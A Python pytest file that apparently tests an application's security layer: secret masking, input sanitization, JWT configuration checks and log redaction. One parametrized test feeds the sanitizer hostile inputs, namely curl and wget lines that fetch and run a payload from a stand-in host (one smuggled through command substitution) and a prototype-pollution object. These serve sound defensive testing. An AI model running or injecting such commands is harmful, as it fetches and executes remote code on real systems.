from __future__ import annotations

import logging

import pytest

from middleware.sanitization import SanitizationError, _sanitize_payload
from security.secure_logging import SensitiveDataFilter
from services.jwt_manager import JwtValidationError, validate_jwt_configuration
from services.sensitive_scanner import mask_sensitive_payload, scan_payload


def test_sensitive_scanner_masks_nested_values() -> None:
    payload = {
        'issue': 'admin@example.com leaked a token',
        'metadata': {'Authorization': 'Bearer secret-token'},
    }
    masked = mask_sensitive_payload(payload)
    findings = scan_payload(payload)
    assert masked['issue'] == '[REDACTED] leaked a token'
    assert masked['metadata']['Authorization'] == '[REDACTED]'
    assert {finding.category for finding in findings} >= {'email', 'sensitive_key'}


@pytest.mark.parametrize(
    'payload',
    [
        {'issue': 'Run curl http://evil.invalid && sh payload.sh'},
        {'issue': '$(wget http://evil.invalid/payload)'},
        {'__proto__': {'polluted': True}, 'issue': 'Valid audit issue.'},
    ],
)
def test_sanitization_rejects_command_and_malicious_json(payload) -> None:
    with pytest.raises(SanitizationError):
        _sanitize_payload(payload)


def test_sanitization_rejects_deep_json_payload() -> None:
    payload = {'issue': 'Valid audit issue.'}
    for _ in range(10):
        payload = {'nested': payload}
    with pytest.raises(SanitizationError, match='nesting depth'):
        _sanitize_payload(payload)


def test_jwt_configuration_flags_weak_secret() -> None:
    findings = validate_jwt_configuration('test-secret', 'HS256')
    assert any('secret is too weak' in finding for finding in findings)
    with pytest.raises(JwtValidationError):
        validate_jwt_configuration('test-secret', 'none', strict=True)


def test_sensitive_data_filter_masks_log_record_extra() -> None:
    record = logging.LogRecord(
        name='security-test',
        level=logging.INFO,
        pathname=__file__,
        lineno=1,
        msg='User admin@example.com failed auth',
        args=(),
        exc_info=None,
    )
    record.payload_snippet = 'password=super-secret'
    assert SensitiveDataFilter().filter(record) is True
    assert 'admin@example.com' not in record.msg
    assert record.payload_snippet == '[REDACTED]'
